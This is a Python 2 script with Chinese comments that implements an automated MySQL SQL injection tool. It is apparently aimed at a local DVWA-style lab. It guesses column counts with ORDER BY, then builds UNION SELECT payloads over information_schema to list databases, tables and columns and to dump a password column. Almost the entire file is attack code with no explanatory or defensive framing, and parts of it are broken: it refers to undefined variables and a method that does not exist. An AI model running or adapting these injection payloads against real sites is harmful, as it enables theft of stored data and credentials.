# coding:utf8
import urllib
import binascii
import re
from selenium import webdriver


class mysqlInject():

    def __init__(self, url):
        self.db = 'database()'
        # self.urlend = urlend
        self.url = url  # 待检测的网址
        self.dblen = 0  # 数据库的长度
        self.counts = 0  # 字段数
        self.tables = []  # 表
        self.dbname = ''
        self.user_agent = "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Mobile Safari/537.36"
        self.cookies = "security=impossible; security=low; PHPSESSID=b8fdcdaf908af7abe26fdc93f3bd4f3e"
        self.headers = {'User-Agent': self.user_agent, 'Cookie': self.cookies}

    # 检测字段数
    def columnCounts(self):
        # browser = webdriver.Chrome()
        # req = request.Request(self.url, headers=self.headers)
        # response = request.urlopen(req)
        # page = str(response.read(), 'UTF-8', 'ignore')
        # html = BeautifulSoup(page, 'html.parser')
        # print(page)
        # temp = html.select('div#footer')[0].select('p')[0].text
        # print (temp + "temp")
        for n in range(1, 100):
            sql = self.url + "1%27order%20by%20" + str(n) + "%20--%20" + self.urlend
            print (sql)
            browser.get(sql)
            # req = request.Request(sql, headers=self.headers)
            # response = request.urlopen(req)
            # pagex = str(response.read(), 'UTF-8', 'ignore')
            # print (pagex)
            # try:
            #     html2 = BeautifulSoup(pagex, 'html.parser')
            #     temp2 = html2.select('div#footer')[0].select('p')[0].text
            #     print (temp2 + "temp2")
            #     if temp != temp2:
            #         self.counts = n - 1
            #         print ('字段数:', self.counts)
            #         break
            # except:
            #     pass
        # if self.counts == 0:
        #     print ('未能猜解出字段数!')

    # 爆出当前数据库名,数据库用户
    def inject5Content(self, sql):
        url = self.url + '%20and%201=2%20UNION%20SELECT%20'
        for x in range(1, self.counts + 1):
            if x != 1:
                url += ','
            url += 'concat(0x25,'
            url += sql
            url += ',0x25)'
        pagec = urllib.urlopen(url).read()
        reg = "%[a-z,0-9,A-Z,.,\-,\\,@,:]*%"
        regob = re.compile(reg, re.DOTALL)
        result = regob.findall(pagec)
        if len(result) != 0:
            strings = result[1]
            strings = strings[1:len(strings) - 1]
            return strings

    def inject5TableNames(self, DB):
        url = self.url + '%20and%201=2%20UNION%20SELECT%20'
        for x in range(1, self.counts + 1):
            if x != 1:
                url += ','
            url += 'concat(0x25,'
            url += 'group_concat(distinct+table_name)'
            url += ',0x25)'
        url += '%20from%20information_schema.columns%20where%20table_schema='
        url += DB
        pagec = urllib.urlopen(url).read()
        reg = "%[a-z,0-9,A-Z,.,\,,\-,\\,@,:]*%"
        regob = re.compile(reg, re.DOTALL)
        result = regob.findall(pagec)
        if len(result) != 0:
            strings = result[1]
            strings = strings[1:len(strings) - 1]
            s = strings.split(',')
            return s

    # 猜解字段名
    def inject5ColumnsName(self, TB):
        url = self.url + '%20and%201=2%20UNION%20SELECT%20'
        for x in range(1, self.counts + 1):
            if x != 1:
                url += ','
            url += 'concat(0x25,'
            url += 'group_concat(distinct+column_name)'
            url += ',0x25)'
        url += '%20from%20information_schema.columns%20where%20table_name='
        url += TB
        pagec = urllib.urlopen(url).read()
        reg = "%[a-z,0-9,A-Z,.,\,,\-,\\,@,:]*%"
        regob = re.compile(reg, re.DOTALL)
        result = regob.findall(pagec)
        if len(result) != 0:
            strings = result[1]
            strings = strings[1:len(strings) - 1]
            s = strings.split(',')
            return s

    # 猜字段内容
    def inject5CountContent(self, TN, CN):
        url = self.url + '%20and%201=2%20UNION%20SELECT%20'
        for x in range(1, self.counts + 1):
            if x != 1:
                url += ','
            url += 'concat(0x25,'
            url += CN
            url += ',0x25)'
        url += '%20from%20'
        url += TN
        pagex = urllib.urlopen(url).read()
        reg = "%[a-z,0-9,A-Z,.,\,,\-,\\,@,:]*%"
        regob = re.compile(reg, re.DOTALL)
        result = regob.findall(pagex)
        if len(result) != 0:
            strings = result[1]
            strings = strings[1:len(strings) - 1]
            print  (CN, ':', strings)

    # 如果数据库的版本大于4,可以使用'查'表的方法注入
    def inject5(self):
        d = 'database()'
        self.database = self.inject5Content(d)
        database0x = binascii.b2a_hex(self.database)
        database0x = '0x' + database0x
        self.inject5TableName(database0x)
        self.inject5TableNames(database0x)
        tb = self.tables[0]
        tb = binascii.b2a_hex(tb)
        tb = '0x' + tb
        self.inject5ColumnsName(tb)
        self.inject5CountContent('gly', 'password')


if __name__ == '__main__':
    inj = mysqlInject("http://192.168.157.129:8080/sqlinj_war/search?id=")
    inj.columnCounts()
    # urlstart = 'http://192.168.157.128/dvwa/vulnerabilities/sqli/?id='
    # urlend = '&Submit=Submit#'
    # inj = mysqlInject(
    # 'http://192.168.157.128/dvwa/vulnerabilities/sqli/?id=', '&Submit=Submit#')
    # browser = webdriver.Chrome()
    # inj.columnCounts()
    # brower = webdriver.Chrome()
    # sql = urlstart + "1%27order%20by%201%20--%20"
    # brower.get(sql)
    # brower.find_element_by_css_selector()
# if __name__ == '__main__':
#     inj = mysqlInject(
#         'http://192.168.157.128/dvwa/vulnerabilities/sqli/?id=', '&Submit=Submit#')
#     inj.columnCounts()
